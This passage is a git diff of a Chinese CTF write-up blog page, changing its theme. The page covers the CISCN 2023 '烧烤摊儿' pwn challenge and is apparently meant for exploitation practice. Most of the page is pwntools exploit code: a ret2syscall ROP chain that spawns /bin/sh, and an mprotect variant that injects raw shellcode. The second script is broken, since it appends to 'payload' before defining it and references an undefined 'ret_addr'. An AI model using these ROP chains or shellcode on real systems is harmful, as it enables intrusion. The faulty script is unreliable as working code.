@@ -1,26 +1,25 @@
+
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-default-color-scheme=auto>
+
+
+
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 8.1.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/css/main.css">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
 
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="[CISCN 2023 初赛]烧烤摊儿     发现在gaming函数中存在将v5变量输入给全局name，并且没有对v5进行长度限制，有栈溢出在.data里发现了name，可以考虑将&#x2F;bin&#x2F;sh写入.data段，因为是静态文件，其中没有libc和system，用ret2syscall构造execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)get shel">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[CISCN 2023 初赛]烧烤摊儿     发现在gaming函数中存在将v5变量输入给全局name，并且没有对v5进行长度限制，有栈溢出在.data里发现了name，可以考虑将&#x2F;bin&#x2F;sh写入.data段，因为是静态文件，其中没有libc和system，用ret2syscall构造execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)get shel">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwn-11月">
 <meta property="og:url" content="http://example.com/2025/11/26/pwn-11/index.html">
@@ -38,432 +37,657 @@
 <meta property="article:modified_time" content="2025-11-30T14:11:58.978Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn">
-<meta name="twitter:card" content="summary">
+<meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/2025/11/26/pwn-11/image-1.png">
+  
+  
+  
+  <title>pwn-11月 - Hexo</title>
 
-<link rel="canonical" href="http://example.com/2025/11/26/pwn-11/">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'en'
-  };
-</script>
 
-  <title>pwn-11月 | Hexo</title>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
 
 
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
 
 
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
 
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+<body>
+  
 
-</head>
+  <header>
+    
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Hexo</h1>
-      <span class="logo-line-after"><i></i></span>
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
     </a>
-  </div>
 
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
-
-  </li>
-  </ul>
 </nav>
 
+  
 
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pwn-11月"></span>
+          
+        </div>
 
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-26 20:00" pubdate>
+          November 26, 2025 pm
+        </time>
+      </span>
+    
+  </div>
 
-</div>
-    </header>
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k words
+        
+      </span>
+    
 
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 mins
+        
+      </span>
+    
+
+    
+    
   </div>
 
 
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/26/pwn-11/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          pwn-11月
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2025-11-26 20:00:19" itemprop="dateCreated datePublished" datetime="2025-11-26T20:00:19+08:00">2025-11-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-11-30 22:11:58" itemprop="dateModified" datetime="2025-11-30T22:11:58+08:00">2025-11-30</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn-wp/" itemprop="url" rel="index"><span itemprop="name">pwn_wp</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+        
+      </div>
 
       
-        <h2 id="CISCN-2023-初赛-烧烤摊儿"><a href="#CISCN-2023-初赛-烧烤摊儿" class="headerlink" title="[CISCN 2023 初赛]烧烤摊儿"></a>[CISCN 2023 初赛]烧烤摊儿</h2><img src="/2025/11/26/pwn-11/image-1.png" class="">
-<img src="/2025/11/26/pwn-11/image-2.png" class=""> 
-<img src="/2025/11/26/pwn-11/image.png" class="">
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">pwn-11月</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="CISCN-2023-初赛-烧烤摊儿"><a href="#CISCN-2023-初赛-烧烤摊儿" class="headerlink" title="[CISCN 2023 初赛]烧烤摊儿"></a>[CISCN 2023 初赛]烧烤摊儿</h2><img src="/2025/11/26/pwn-11/image-1.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2025/11/26/pwn-11/image-2.png" srcset="/img/loading.gif" lazyload class=""> 
+<img src="/2025/11/26/pwn-11/image.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>发现在gaming函数中存在将v5变量输入给全局name，并且没有对v5进行长度限制，有栈溢出<br>在.data里发现了name，可以考虑将&#x2F;bin&#x2F;sh写入.data段，因为是静态文件，其中没有libc和system，用ret2syscall构造execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)get shell<br>确定程序中存在pop rax ；ret ，还要存在syscall</p>
 <p>首先需要通过 j_strcpy_ifunc(&amp;name, v5) 向 name 中写入 b’&#x2F;bin&#x2F;sh\x00’，并溢出 v5 构造 execve(“&#x2F;bin&#x2F;sh”, NULL, NULL) 执行</p>
 <p>注意这里是将 b’&#x2F;bin&#x2F;sh\x00’ 写入到 name，所以只能一次性 get shell</p>
 <p>如果分两次的话，例如：第一次写入 b’&#x2F;bin&#x2F;sh\x00’，第二次执行 execve(“&#x2F;bin&#x2F;sh”, NULL, NULL)，则在第二次中执行 j_strcpy_ifunc(&amp;name, v5) 又会将 name 覆盖掉，导致 get shell 失败</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment"># 打印调试信息</span></span><br><span class="line">content = <span class="number">0</span> <span class="comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./shaokao&quot;</span>)  <span class="comment"># 程序路径</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;39.107.137.13&quot;</span>, <span class="number">20341</span>)  <span class="comment"># 题目的远程端口</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./shaokao&quot;</span>)</span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x4E60F0</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x40264f</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x40a67e</span></span><br><span class="line">pop_rdx_rbx_addr = <span class="number">0x4a404b</span></span><br><span class="line">pop_rax_addr = <span class="number">0x458827</span></span><br><span class="line">syscall_addr = <span class="number">0x402404</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;-100000000&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(pop_rax_addr) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(name_addr)</span><br><span class="line">payload += p64(pop_rsi_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_rbx_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)  <span class="hljs-comment"># 打印调试信息</span><br>content = <span class="hljs-number">0</span> <span class="hljs-comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><br><br><span class="hljs-keyword">if</span> content == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&quot;./shaokao&quot;</span>)  <span class="hljs-comment"># 程序路径</span><br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&quot;39.107.137.13&quot;</span>, <span class="hljs-number">20341</span>)  <span class="hljs-comment"># 题目的远程端口</span><br><br>elf = ELF(<span class="hljs-string">&quot;./shaokao&quot;</span>)<br><br>name_addr = <span class="hljs-number">0x4E60F0</span><br>pop_rdi_addr = <span class="hljs-number">0x40264f</span><br>pop_rsi_addr = <span class="hljs-number">0x40a67e</span><br>pop_rdx_rbx_addr = <span class="hljs-number">0x4a404b</span><br>pop_rax_addr = <span class="hljs-number">0x458827</span><br>syscall_addr = <span class="hljs-number">0x402404</span><br><br>io.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;-100000000&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += p64(pop_rax_addr) + p64(<span class="hljs-number">0x3b</span>)<br>payload += p64(pop_rdi_addr) + p64(name_addr)<br>payload += p64(pop_rsi_addr) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx_rbx_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(syscall_addr)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
 
 <p>法二：用mprotect</p>
-<img src="/2025/11/26/pwn-11/image-3.png" class=""> 
+<img src="/2025/11/26/pwn-11/image-3.png" srcset="/img/loading.gif" lazyload class=""> 
 <p>name在0x4E60F0<br>用vmmap查看发现0x4e6000-0x4e9000没有执行权限,先利用栈溢出执行mprotect函数，将其权限设为0x7，然后返回main函数，将shellcode写入name</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment"># 打印调试信息</span></span><br><span class="line">content = <span class="number">0</span> <span class="comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./shaokao&quot;</span>)  <span class="comment"># 程序路径</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28438</span>)  <span class="comment"># 题目的远程端口</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./shaokao&quot;</span>)</span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">make_addr=<span class="number">0x4e6000</span> <span class="comment">#页面对齐地址</span></span><br><span class="line">size=<span class="number">0x3000</span></span><br><span class="line">name_addr = <span class="number">0x4E60F0</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x40264f</span><span class="comment">#修改内存页首地址</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x40a67e</span><span class="comment">#修改内存页大小</span></span><br><span class="line">pop_rdx_rbx_addr = <span class="number">0x4a404b</span><span class="comment">#修改权限</span></span><br><span class="line"><span class="comment">#pop_rax_addr = 0x458827</span></span><br><span class="line"><span class="comment">#syscall_addr = 0x402404</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;-100000000&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_addr) + p64(<span class="number">0x4E6000</span>) + p64(pop_rsi_addr) + p64(<span class="number">0x3000</span>) + p64(pop_rdx_rbx_addr) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)  <span class="comment"># 布置mprotect()函数的参数</span></span><br><span class="line">payload += p64(mprotect_addr) + p64(ret_addr) + p64(main_addr)  <span class="comment"># 跳转到mprotect()函数后返回到main()数</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;-100000000&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">shellcode = <span class="string">b&#x27;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(name_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)  <span class="hljs-comment"># 打印调试信息</span><br>content = <span class="hljs-number">0</span> <span class="hljs-comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><br><br><span class="hljs-keyword">if</span> content == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&quot;./shaokao&quot;</span>)  <span class="hljs-comment"># 程序路径</span><br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28438</span>)  <span class="hljs-comment"># 题目的远程端口</span><br><br>elf = ELF(<span class="hljs-string">&quot;./shaokao&quot;</span>)<br><br>mprotect_addr = elf.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>make_addr=<span class="hljs-number">0x4e6000</span> <span class="hljs-comment">#页面对齐地址</span><br>size=<span class="hljs-number">0x3000</span><br>name_addr = <span class="hljs-number">0x4E60F0</span><br>pop_rdi_addr = <span class="hljs-number">0x40264f</span><span class="hljs-comment">#修改内存页首地址</span><br>pop_rsi_addr = <span class="hljs-number">0x40a67e</span><span class="hljs-comment">#修改内存页大小</span><br>pop_rdx_rbx_addr = <span class="hljs-number">0x4a404b</span><span class="hljs-comment">#修改权限</span><br><span class="hljs-comment">#pop_rax_addr = 0x458827</span><br><span class="hljs-comment">#syscall_addr = 0x402404</span><br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>io.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>io.sendline(<span 